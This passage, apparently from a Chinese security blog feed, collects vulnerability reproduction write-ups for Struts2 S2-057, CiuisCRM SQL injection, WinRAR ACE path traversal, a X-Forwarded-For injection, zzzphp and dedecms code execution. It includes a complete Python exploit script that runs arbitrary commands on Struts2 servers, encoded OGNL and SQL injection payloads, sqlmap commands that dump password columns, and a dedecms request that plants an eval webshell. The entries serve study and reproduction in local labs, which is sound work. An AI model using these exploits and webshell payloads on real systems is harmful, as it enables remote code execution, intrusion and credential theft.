class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;            &lt;result type=&quot;redirectAction&quot;&gt;            &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;            &lt;/result&gt;            &lt;/action&gt;        &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt;            &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt;        &lt;/action&gt;        &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt;            &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><p>在tomcat下bin目录下运行shutdown.bat，startup.bat脚本来重启tomcat。<br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br>浏览器访问<code>http://192.168.10.230:8080/struts2-showcase/</code>,漏洞环境成功搭建</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在URL构造ognl表达式，再加上配置文件中的action标签中的name属性值，并以.action结尾<br><code>http://127.0.0.1:8080/struts2-showcase/${(50+50)}/actionChain1.action</code><br>执行完成之后发现跳转到了<br><code>http://127.0.0.1:8080/struts2-showcase/100/register2.action</code><br>执行了ognl 表达式 ${(50+50)},漏洞存在</p><p>进一步利用漏洞，弹出计算器，构造payload</p><pre><code>${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))}</code></pre><p>进行URL编码 </p><pre><code>%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d</code></pre><p>拼接</p><pre><code>127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action</code></pre><p>成功执行<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802131043.png" alt></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#coding: utf-8#! python2import requestsimport sysdef expliot(host, command, path):    &#39;&#39;&#39;    2.3.34版本    payload1:    ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    2.3.20版本    payload2:    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    &#39;&#39;&#39;    str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot;    str1 = str1.encode(&#39;hex&#39;)    str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot;    str2 = str2.encode(&#39;hex&#39;)    # 需要进行URL编码    payload1 = &quot;&quot;    for i in range(0, len(str1), 2):        payload1 += &#39;%&#39; + str1[i:i + 2]    payload2 = &quot;&quot;    for i in range(0, len(str2), 2):        payload2 += &#39;%&#39; + str2[i:i + 2]    url1 = host + &#39;/&#39; + payload1 + &#39;/&#39; + path    url2 = host + &#39;/&#39; + payload2 + &#39;/&#39; + path    res1 = requests.get(url1, allow_redirects=False)    res2 = requests.get(url2, allow_redirects=False)    if res1.status_code == 200 and res2.status_code != 200:        print(&quot;Exploit successful:&quot;)        print(res1.content)    elif res2.status_code == 200 and res1.status_code != 200:        print(&quot;Exploit successful:&quot;)        print(res2.content)    else:        print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;)if __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 4:        print(&quot;Usage: python s2-057-exp.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;)    else:        expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())</code></pre><p>使用方法：</p><p><code>python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}</code></p><p>例如:<br><code>python2 struts2.py http://192.168.50.197:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action</code></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.cuittk.cn/2019/01/02/CVE-2018-11776漏洞从搭建到复现/" target="_blank" rel="noopener">CVE-2018-11776漏洞从搭建到复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> CVE-2018-11776 </tag>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ciuis CRM 1.6 - &#39;eventType&#39; SQL Inj.复现</title>
      <link href="/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/"/>
      <url>/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h1><pre><code>===========================================================================================# Exploit Title: CiuisCRM 1.6 - &#39;eventType&#39; SQL Inj.# Dork: N/A# Date: 27-05-2019# Exploit Author: Mehmet EMİROĞLU# Vendor Homepage: https://codecanyon.net/item/ciuis-crm/20473489# Software Link: https://codecanyon.net/item/ciuis-crm/20473489# Version: v1.6# Category: Webapps# Tested on: Wamp64, Windows# CVE: N/A# Software Description: Ciuis CRM you can easily manage your customer relationships and save time on your business.===========================================================================================# POC - SQLi# Parameters : eventType# Attack Pattern :-1+or+1%3d1+and(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)# POST Method : http://localhost/ciuiscrm-16/calendar/addevent===========================================================================================</code></pre><hr><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>下载Ciuis CRM 1.6，搭建本地环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175019.png" alt></p><p>点击CALENDAR，然后点添加按钮<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175107.png" alt></p><p>随便填入东西，使用burpsuite抓包<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175408.png" alt></p><p>在<code>eventType=1</code>后面添加单引号，发包，出现报错信息，存在注入点<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175628.png" alt></p><p>将请求信息保存下来（ciuis.txt）用sqlmap跑</p><p><code>python sqlmap.py -r F:\Desktop\ciuis.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181356.png" alt></p><p>查数据库<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt --dbs</code></p><p>查表<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis --tables</code></p><p>查字段<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags --columns</code></p><p>dump出指定字段<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags -C id,password --dump</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181516.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181614.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://exploit.kitploit.com/2019/07/ciuiscrm-16-sql-injection.html" target="_blank" rel="noopener">CiuisCRM 1.6 SQL Injection</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> Ciuis CRM 1.6 </tag>
            
            <tag> SQL Inj. </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRAR目录穿越漏洞复现</title>
      <link href="/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/"/>
      <url>/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，<br>没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。<br>而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，<br>将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p><hr><h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p><strong>影响版本：</strong><br>       * WinRAR &lt; 5.70 Beta 1<br>       * Bandizip &lt; = 6.2.0.0<br>       * 好压(2345压缩) &lt; = 5.9.8.10907<br>       * 360压缩 &lt; = 4.0.0.1170<br>       * ……</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>新建一个任意文件，名称类型内容随意<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155542.png" alt></p><p>使用Winace进行压缩<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155906.png" alt></p><p>然后下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本<br>输入命令<code>python acefile.py --headers test.ace</code> 读取文件的头部信息<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160308.png" alt></p><p>ok，开始构造恶意文件<br>用 010Editor 打开test.ace文件<br>需要修改以下参数：</p><ul><li>hdr_crc</li><li>hdr_size</li><li>filename的长度</li><li>filename<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160517.png" alt><br>首先将filename的值改为 <code>d:\d:\liehu.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161040.png" alt></li></ul><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161237.png" alt></p><p>修改后的filename的长度，选中它，左下角就是它的长度15，16进制为00 0F，filename的前两位就是它的长度<br>修改顺序是由后到前，即将10改为0F即可<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161841.png" alt></p><p>修改<strong>hdr_size</strong>，选中如下位置，左下角查看其长度，这里是（00 2E），选中的前面的红框就是hdr_size<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162147.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162439.png" alt></p><p>最后修改<strong>hdr_crc</strong>，再次运行<br><code>python acefile.py --headers test.ace</code><br>CRC校验失败，报错<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162831.png" alt><br>在acefile.py文件中查找 <code>header CRC failed</code><br>在其上面一行添加输出语句，输出ace_crc16(buf)，即为我们需要的<strong>hdr_crc</strong>的值<br><code>print (ace_crc16(buf), buf)</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163206.png" alt></p><p>改好保存，再次运行<br><code>python acefile.py --headers test.ace</code><br>31102即我们需要的值，转换成16进制为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163625.png" alt></p><p>将<strong>hdr_size</strong> 前面的两位即为<strong>hdr_crc</strong>，从右到左修改为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164206.png" alt></p><p>再次运行<br><code>python acefile.py --headers test.ace</code><br>输出如下信息无报错，就成功了，用开头所述解压工具解压test.ace，就会在红框的路径生成对应的文件。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164506.png" alt></p><hr><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ol><li>升级最新的WinRAR ，目前版本是 5.71 </li><li>winRAR安装目录下，删除UNACEV2.dll文件</li></ol><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/" target="_blank" rel="noopener">WinRAR漏洞复现过程</a><br><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> WinRAR </tag>
            
            <tag> 目录穿越 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树洞外链X_FORWARDED_FOR注入漏洞复现</title>
      <link href="/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>树洞外链现在已经停止更新，作者又开发了<a href="https://github.com/cloudreve/Cloudreve" target="_blank" rel="noopener">Cloudreve</a>，有兴趣可以了解一下。<br>回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。<br>树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可以复现。</p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>在<code>/includes/function.php</code>的37行左右，获取了X_FORWARDED_FOR，并未做防注入过滤 </p><pre><code>function get_real_ip(){$ip=false;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;])){$ip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];}if (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {$ips = explode (&quot;, &quot;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }for ($i = 0; $i &lt; count($ips); $i++) {if (!eregi (&quot;^(10|172\.16|192\.168)\.&quot;, $ips[$i])) {$ip = $ips[$i];break;}}}return ($ip ? $ip : $_SERVER[&#39;REMOTE_ADDR&#39;]);}</code></pre><p>然后在<code>includes/save.php</code>  20行左右发现调用<code>get_real_ip()</code>函数</p><pre><code>$ip=get_real_ip();$dd=date(&#39;Y-m-d H:i:s&#39;);$rand = md5(time() . mt_rand(0,1000));$stmt = $con-&gt;prepare(&quot;INSERT INTO  `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, &#39;$rand&#39;, &#39;$ip&#39;, &#39;$dd&#39;, &#39;0&#39; , &#39;$uploadUser&#39;, &#39;$policyId&#39;);&quot;);$stmt-&gt;bind_param(&#39;s&#39;, $ming);</code></pre><hr><h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>下载树洞外链源码，本地搭建环境。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726110921.png" alt></p><p>注册账号登陆，然后打开burpsuite，关掉拦截<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111147.png" alt><br>然后上传文件，在HTTP history里找到<code>/includes/save.php</code>,发送到Repeater<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111306.png" alt><br>构造payload并发送</p><pre><code>X-Forwarded-For: 1.1.1.1′,user(),’0′,1,1); #ming=aa</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111644.png" alt></p><p>然后在<strong>我的文件</strong>里面可以看到执行结果<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111744.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/179363.html" target="_blank" rel="noopener">代码审计树洞X_FORWARDED_FOR注入</a><br><a href="https://blog.csdn.net/qq_21510303/article/details/91886405" target="_blank" rel="noopener">代码审计之头部注入X-Forwarded-For</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> 树洞外链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzzphp V1.6.1 远程代码执行漏洞复现</title>
      <link href="/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/"/>
      <url>/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，<br>导致在后台可以写入php代码从而造成代码执行。</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建zzzphp V1.6.1环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141219.png" alt></p><p>在后台模块管理中的电脑模块找到cn2016<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141335.png" alt></p><p>然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为<br><code>{if:assert($_request[phpinfo()])}phpinfo();{end if}</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141523.png" alt></p><p>然后打开<code>http://xxx/zzzcms/search/</code>就可以看到我们刚刚输入的phpinfo()执行了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141748.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4471" target="_blank" rel="noopener">zzzphp V1.6.1 远程代码执行漏洞分析</a><br><a href="https://www.anquanke.com/post/id/173991" target="_blank" rel="noopener">zzzphpV1.6.1 远程代码执行漏洞简单分析</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> zzzphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms V5.7-UTF-8-SP2 命令执行漏洞复现</title>
      <link href="/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724101304.png" alt></p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>环境搭建这里不再赘述，搭建好后访问网站主页<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102343.png" alt></p><p>dedecms默认的后台是/dede,没有修改直接访问登陆<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102453.png" alt></p><p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102828.png" alt></p><p><strong>代码分析</strong></p><pre><code>(1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步(2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。(3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html*   [a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点   所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。(4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec(5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用(6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施，        导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了</code></pre><p>根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。</p><hr><h1 id="三-、漏洞复现"><a href="#三-、漏洞复现" class="headerlink" title="三 、漏洞复现"></a>三 、漏洞复现</h1><p>获取token，访问 域名 + /dede/tpl.php?action=upload<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104103.png" alt><br>然后查看网页源代码，找到token<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104145.png" alt><br>构造payload如下<br><a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)</a><br>访问了成功写入<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104653.png" alt><br>访问写入的文件，域名+include/taglib/（你上传的文件名）.lib.php<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104810.png" alt><br>也可以构造一句话木马payload，<a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929</a><br>直接用菜刀连接<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724105245.png" alt></p><hr><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>虽然这个漏洞很鸡肋，需要拿到管理员账号密码才行，但还是有必要复现了解，反复练习才能有进步。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01221" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a><br><a href="https://blog.csdn.net/qq_41954384/article/details/93057317" target="_blank" rel="noopener">dedeCMS后台代码执行漏洞-CNVD-2018-01221</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> dedecms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz ML! V3.X 代码注入漏洞复现</title>
